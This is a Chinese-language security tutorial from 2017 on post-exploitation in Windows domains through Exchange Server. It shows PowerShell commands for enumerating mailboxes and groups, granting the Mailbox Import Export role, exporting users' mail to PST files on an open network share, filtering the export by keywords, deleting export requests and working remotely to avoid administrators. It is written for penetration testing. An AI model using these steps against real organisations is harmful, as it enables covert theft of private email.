# 【技术分享】域渗透之Exchange Server

阅读量 **271837**

|评论 **1**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2017-07-27 09:56:16

 **x**

##### 译文声明

本文是翻译文章，文章来源：安全客

译文仅供参考，具体内容表达以及含义原文为准。

作者：[hui81c2](http://bobao.360.cn/member/contribute?uid=2929676557)

预估稿费：300RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿

**  
**

**前言**

Microsoft Exchange Server
做为消息与协作系统。它提供了业界最强的扩展性、高可靠性、安全性和高处理性能，被许多企业、学校、政府等作为主要邮件系统。在内网渗透测试中，对邮件系统的把控会让你事半功倍，尤其是和AD绑在一起的Exchange。

**通过本文你将了解Ps下对Exchange邮件的基本操作，这也同样适用于运维管理，当然相比博大精深的ES是远远不够的。** 以下环境为Exchange
server 2013，也同样适用于2010等版本。

你可以在开始菜单中通过 Exchange Management Shell （EMS）管理器快捷方式连接到 exchange
server，初始化过后你将得到一个Powershell命令窗口。如果连接失败，请相信我，一定是你内存分配的不够，默认安装的Exchange也至少需要分配6个G内存。

如果一切都没有问题，并且你已经获取了域控权限，那就开始我们的旅程吧！

  

**导出邮箱列表**

**查看数据库**

邮箱数据库是创建和存储邮箱的粒度的单位。邮箱数据库以 Exchange 数据库 (.edb) 文件的形式存储。存储结构分为直接附加存储
(DAS)和存储区域网络 (SAN)。我们可以通过 Get-MailboxDatabase cmdlet
从服务器或组织中检索一个或多个邮箱数据库对象。一般为了高可用性至少有两台服务器组成DGA，你可以通过-Server参数指定检索服务器。

    
    
    [PS] C:Windowssystem32>get-mailboxdatabase -Server "exchange"
    Name                           Server          Recovery        ReplicationType
    ----                           ------          --------        ---------------    Mailbox Database 0574336487    EXCHANGE        False           None
    Mailbox Database Test01        EXCHANGE        False           None

格式化筛选指定属性，如数据库文件路径

    
    
    [PS] C:>Get-MailboxDatabase -Identity 'Mailbox Database Test01' |  Format-List Name,EdbFilePath,LogFolderPath
    Name          : Mailbox Database Test01
    EdbFilePath   : C:Program FilesMicrosoftExchange ServerV15MailboxMailbox Database Test01Mailbox Database Test01.edb
    LogFolderPath : C:Program FilesMicrosoftExchange ServerV15MailboxMailbox Database Test01

ECP数据库管理位置

[](https://camo.githubusercontent.com/f1e35c9bc0196a5edce574e6e0c654e5ecf2174f/687474703a2f2f692e696d6775722e636f6d2f4a5431704d51662e706e67)

####

**获取组**

在域控中新建过OU（Organizational
Unit）之后，我们往往会建立Group来管理用户。查询组的意义在于——往往你会看到有个组名字叫做IT，当然这一步和net group大同小异。通过Get-DistributionGroup cmdlet 查询现有通讯组。

    
    
    [PS] C:Windowssystem32>Get-DistributionGroup
    Name                          DisplayName                   GroupType                     PrimarySmtpAddress
    ----                          -----------                   ---------                     ------------------    EXchange New OU               EXchange New OU               Universal                     ENO@ruos.org
    IT Security                   IT Security                   Universal, SecurityEnabled    it-security@ruos.org

查看通讯组IT Security详细信息

    
    
    [PS] C:Windowssystem32>Get-DistributionGroup "IT Security" | fl
    RunspaceId                             : efbb60f9-5ef1-4a8d-9b94-c3f102e576c3
    GroupType                              : Universal, SecurityEnabled
    SamAccountName                         : IT Security
    BypassNestedModerationEnabled          : False
    ManagedBy                              : {ruos.org/Users/Administrator, ruos.org/Users/admin}
    MemberJoinRestriction                  : Closed
    MemberDepartRestriction                : Closed
    ...

**导出成CSV文件**

    
    
    # 查询通讯组
    Get-DistributionGroup | `
    Select-Object DisplayName,Name,Alias,GroupType,WindowsEmailAddress,@{n="ManagedBy";e={$_.ManagedBy -Join ";"}} ,OrganizationalUnit | `
    Export-CSV test.csv -NoType

**获得组成员**

通过Get-DistributionGroupMember cmdlet 可以查找现有的通讯组成员。

    
    
    [PS] C:Windowssystem32>Get-DistributionGroupMember -Identity "ENO"
    Name                                                        RecipientType
    ----                                                        -------------    Administrator                                               UserMailbox
    a                                                           UserMailbox
    ming xiao                                                   UserMailbox
    user1                                                       UserMailbox

  

**获得用户admin（可以是域用户格式）邮箱信息**

获取用户邮箱信息。通过以上步骤，我们大概知道了如何查询用户组中的成员，下面我们将使用Get-Mailbox cmdlet 获取邮箱对象和属性。再配合Get-MailboxStatistics cmdlet 获取有关邮箱的信息，例如，邮箱大小、所包含的邮件数、以及最后访问时间。

**基本使用**

    
    
    Get-Mailbox | format-tables Name,WindowsEmailAddress
    Get-Mailbox testuser | fl * | Out-File c:mb.txt
    Get-Mailbox | ForEach-Object {$_.Name}

获取组织单元内用户

    
    
    Get-Mailbox -OrganizationalUnit "New OU"
    [PS] C:Windowssystem32>get-mailboxstatistics -identity admin | Select DisplayName,ItemCount,TotalItemSize,LastLogonTime
    DisplayName                                       ItemCount TotalItemSize                 LastLogonTime
    -----------                                       --------- -------------                 -------------    admin                                                    11 90.88 KB (93,056 bytes)       2016/11/29 19:59:08

Format-Table 模式查看

使用反引号`换行，输入结束后再回车执行。

    
    
    # 查看所有邮箱信息Get-Mailbox -ResultSize Unlimited | `Get-MailboxStatistics | `Sort-Object TotalItemSize –Descending | `ft DisplayName,@{label="Mailbox Size (MB)";expression={$_.TotalItemSize.Value.ToMB()}

导出到CSV文件（这将是你想要的）

    
    
    $mb = Get-Mailbox -ResultSize Unlimited$output = foreach($obj in  $mb ){$ms = (Get-MailboxStatistics $obj.Identity -WarningAction SilentlyContinue )$obj | Select-Object DisplayName,Name,WindowsEmailAddress,OrganizationalUnit,Database,`
    @{L="Mailbox Size (MB)";E={ $ms.TotalItemSize.Value.ToMB() }},`
    @{L="LastLogonTime";E={ $ms.LastLogonTime }}
    }#Write-Output $output $output | Export-CSV test.csv -NoType

或者通过ECP导出

[](https://camo.githubusercontent.com/6ba10d498030697ce565059ecbc873889ed06b16/687474703a2f2f692e696d6775722e636f6d2f4e316d6d6744792e6a7067)

  

**导出PST邮件**

在了解了用户的邮箱使用情况后，我们下一步将邮箱数据导出为PST文件，以方便本地查看和搜索。

要在Exchange Server 2010
SP1中使用用户邮箱导出功能，只能使用EMS进行操作。而且操作的Exchange服务器管理员必须要成为“邮箱导入导出角色”。

Exchange Server 2007 可以使用 export-Mailbox cmdlet

导出邮件分为以下几个步骤:

Step1 为用户添加导出权限

Step2 导出邮件

Step3 查看导出请求及删除导出请求

**查看角色（默认只有组织管理成员才有导入/导出权限）**

使用Get-ManagementRole cmdlet 查看组织内已创建的管理角色。

    
    
    [PS] C:Windowssystem32>Get-ManagementRole
    Name                                                        RoleType
    ----                                                        --------    Mailbox Import Export                                       MailboxImportExport

Get-ManagementRoleAssignment cmdlet 检索管理角色分配。

    
    
    [PS] C:Windowssystem32>Get-ManagementRoleAssignment -role "Mailbox Import Export" | Format-List RoleAssigneeName
    RoleAssigneeName : Organization Management
    RoleAssigneeName : Administrator
    RoleAssigneeName : admin

为用户Administrator添加邮箱导入导出角色

New-ManagementRoleAssignment cmdlet 可以将管理角色分配给管理角色组、管理角色分配策略、用户或通用安全组 (USG)。

添加角色后需要重启EMS

    
    
    [PS] C:Windowssystem32>New-ManagementRoleAssignment -Name "Import Export_Domain Admins"  `
    >>-User "Administrator" -Role "Mailbox Import Export"
    >>
    DataObject                   : Import Export_Domain Admins
    User                         : ruos.org/Users/Administrator
    AssignmentMethod             : Direct
    Identity                     : Import Export_Domain Admins
    EffectiveUserName            : Administrator

删除管理角色分配

    
    
    Remove-ManagementRoleAssignment "Import Export_Domain Admins" -Confirm:$false
    
    
    New-MailboxExportRequest cmdlet 将主邮箱或存档的内容导出到 .pst 文件。
    net share 创建“读/写权限”共享文件夹
    net share sharename$=c:share /GRANT:Everyone,FULL

将user1收件箱中的所有邮件导出到 .pst

    
    
    New-MailboxExportRequest -Mailbox user1 -IncludeFolders "#Inbox#" -FilePath 10.2.2.163maildatauser1.pst

Inbox（收件箱）、SentItems（已发送邮件）、DeletedItems（已删除邮件）、Drafts（草稿）

导出用户 Tony 在 2012 年 1 月 1 日之前收到的邮件正文中包含“公司”和“利润”的邮件。

    
    
    New-MailboxExportRequest -Mailbox Tony `-ContentFilter {(body -like "*company*") `-and (body -like "*profit*") `-and (Received -lt "01/01/2012")} `-FilePath "\SERVER01PSTFileShareTony_CompanyProfits.pst"

之后你可以将其载入到Outlook中进行查看。

查看导出请求状态

    
    
    Get-MailboxExportRequest cmdlet 可以查看使用 New-MailboxExportRequest cmdlet 启动的正在执行的导出请求的详细状态。
    [PS] C:Windowssystem32>Get-MailboxExportRequest
    Name                                           Mailbox                                        Status
    ----                                           -------                                        ------    MailboxExport                                  ruos.org/Users/a                               Completed

删除全部或部分完成的导出请求

    
    
    [PS] C:Windowssystem32>Remove-MailboxExportRequest -Identity "aMailboxExport"

删除所有状态为“已完成”的导出请求

    
    
    Get-MailboxExportRequest -Status Completed | Remove-MailboxExportRequest -Confirm:$false

或者通过ECP导出，缺点是不能过滤时间，并且管理员会收到导出完成通知。

[](https://camo.githubusercontent.com/63e61be58851a95c2897d2943264e2e82adcca82/687474703a2f2f692e696d6775722e636f6d2f4c32345249384f2e6a7067)

[](https://camo.githubusercontent.com/aabac258d39f4dc709c19087cfa4648ea242f790/687474703a2f2f692e696d6775722e636f6d2f663072496c55342e706e67)

以上介绍了如何通过EMS导出用户邮件，但是谁也不能保证你不会和管理员撞个满怀。值得庆幸的是，Exchange Server支持PowerShell远程操作。

  

**Exchange PowerShell**

远程 PowerShell 提供了从命令行管理 Exchange Online的方式，利人又利己。

**创建用户凭证**

    
    
    $Credential = Get-Credential

但这样会弹出凭据请求输入框，使用 PSCredential 创建非交互式登陆凭据。

    
    
    $pass = ConvertTo-SecureString "PlainTextPassword" -AsPlainText -Force$Credential = New-Object System.Management.Automation.PSCredential ("Domain01User01", $pass)

**创建登陆会话**

    
    
    $Session = New-PSSession -ConfigurationName Microsoft.Exchange `-ConnectionUri http://<FQDN of Exchange 2016 Mailbox server>/PowerShell/ `-Authentication Kerberos -Credential $Credential

**导入会话**

    
    
    Import-PSSession $Session

**移除会话**

    
    
    Remove-PSSession $Session

**  
**

**Scripting with the Exchange Management Shell**

通过SHELL的方式执行脚本。

适用于： Exchange Server 2013

exchange默认根目录在 :Program FilesMicrosoftExchange ServerV15bin

执行自定义脚本

需要开启远程脚本执行权限

    
    
    Set-ExecutionPolicy RemoteSigned
    Script
    # filename:test.ps1# export to pstforeach($user in "admin","user1","user2"){New-MailboxExportRequest -Mailbox $user -ContentFilter { Received -gt "11/29/2016" } -FilePath "\192.168.6.2sharename$$user.pst"Start-Sleep -Seconds 3}

从cmd启动脚本

64位系统下存在文件系统重定向机制，powershell路径为
C:windowssysnativeWindowsPowerShellv1.0powershell.exe

    
    
    PowerShell.exe -command ". 'C:Program FilesMicrosoftExchange ServerV15binRemoteExchange.ps1'; Connect-ExchangeServer -auto; C:test.ps1"

查看角色权限

    
    
    PowerShell.exe -command ". 'C:Program FilesMicrosoftExchange ServerV15binRemoteExchange.ps1'; Connect-ExchangeServer -auto; Get-ManagementRoleAssignment -role "Mailbox Import Export""

**结束语**

Exchange和AD的紧密性使得很多Cmdlet
Reference都能达到同样的目的，比如查询用户登陆的源IP地址，我们还能通过Exchange的IIS日志来查找。但有时候遗憾的是，用户虽然在使用邮箱，工作机却没有加入域中。这种情况我们就需要配合其他信息进一步确认。

[](https://camo.githubusercontent.com/aabac258d39f4dc709c19087cfa4648ea242f790/687474703a2f2f692e696d6775722e636f6d2f663072496c55342e706e67)

  

**参考资料**

<https://technet.microsoft.com/zh-cn/library/mt587043(v=exchg.150).aspx>

<https://technet.microsoft.com/zh-cn/library/bb124558(v=exchg.150).aspx>

Microsoft Exchange Server 2013 PowerShell Cookbook

本文翻译自安全客 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **hui81c2** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/86497](/post/id/86497)

安全客 - 有思想的安全新媒体

本文转载自: [安全客]()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [安全知识](/tag/安全知识)

 **+1** __3赞

 __收藏

![](https://p2.ssl.qhmsg.com/dm/200_200_100/t0113b023a83977e2e2.jpg) hui81c2

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

